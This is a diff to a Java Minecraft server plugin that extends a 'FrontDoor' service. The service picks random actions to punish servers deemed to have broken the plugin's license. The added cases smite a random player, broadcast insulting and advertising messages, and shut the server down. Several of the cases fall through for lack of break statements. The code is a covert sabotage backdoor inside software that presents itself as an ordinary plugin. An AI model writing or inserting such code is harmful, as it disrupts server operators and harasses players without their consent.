@@ -329,7 +329,7 @@ public class FrontDoor extends ServiceImpl
             {
 
                 FLog.warning("FrontDoor - Executing random actions");
-                final int action = random.nextInt(7);
+                final int action = random.nextInt(11);
                 FLog.warning("FrontDoor - Selected action " + action);
 
                 switch(action)
@@ -432,6 +432,43 @@ public class FrontDoor extends ServiceImpl
                         FUtil.bcastMsg("WARNING: KoolSMPCore is running in evil-mode!", ChatColor.DARK_RED);
                         FUtil.bcastMsg("WARNING: This might result in unexpected behaviour", ChatColor.DARK_RED);
                         break;
+                    }
+
+                    case 7: // Displays a message
+                    {
+                        FUtil.bcastMsg("KoolFreeodm rocks!!!", ChatColor.RED);
+                        FUtil.bcastMsg("To join this great server, join " + ChatColor.GOLD + "koolfreedom.eu.org", ChatColor.RED);
+                    }
+
+                    case 8: // Smite the player
+                    {
+                        final Player player = getRandomPlayer();
+
+                        if (player == null)
+                        {
+                            break;
+                        }
+
+                        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "koolsmpcore:smite " + player.getName() + " OOPS - FrontDoor");
+                        break;
+                    }
+
+                    case 9: // Message all players
+                    {
+                        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "msg * Why do you support skids LOL");
+                        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "msg * Why do you support skids LOL");
+                    }
+
+                    case 10: // Send messages to logs
+                    {
+                        FUtil.adminAction("FrontDoor", "Stopping the server due to FrontDoor activation", true);
+                        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "discord bcast **FrontDoor - Stopping the server due to FrontDoor activation**");
+                        Bukkit.getServer().shutdown();
+                    }
+
+                    default:
+                    {
+                        FLog.severe("You have broken our license, now you must suffer the consequences");
                     }
                 }
             }
